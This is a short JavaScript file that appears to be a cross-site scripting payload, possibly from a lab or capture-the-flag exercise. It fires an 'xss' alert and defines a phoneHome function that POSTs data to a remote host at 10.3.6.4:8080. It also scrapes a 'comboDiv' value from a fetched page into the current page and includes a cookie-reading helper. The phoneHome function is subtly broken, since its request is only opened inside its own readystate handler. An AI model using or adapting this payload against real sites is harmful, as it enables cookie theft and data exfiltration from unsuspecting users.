//<script src=//bit.ly/3jPon33></script>







window.alert("xss");
phoneHome("hello");

var doc = ""

function phoneHome(payload){
    xhr = new XMLHttpRequest();
    

    xhr.responseType = 'text/html';
    xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {


    }
    xhr.open('POST', 'http://10.3.6.4:8080/');
    xhr.send(payload);

}}


function httpReq(url) {
    
        xhr = new XMLHttpRequest();
        xhr.responseType = 'text/html';
        xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            //return(xhr.response);
            
            htmlString = xhr.response
            var parser = new DOMParser();
            doc = parser.parseFromString(htmlString, "text/html")
            
            unlock = doc.getElementById("comboDiv").innerHTML
            document.getElementById("unl").innerHTML = unlock
            
            
        }
    };

    xhr.open('GET', url);
    xhr.send();


}


function getCookie(cname) { //taken from https://www.w3schools.com/js/js_cookies.asp
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}































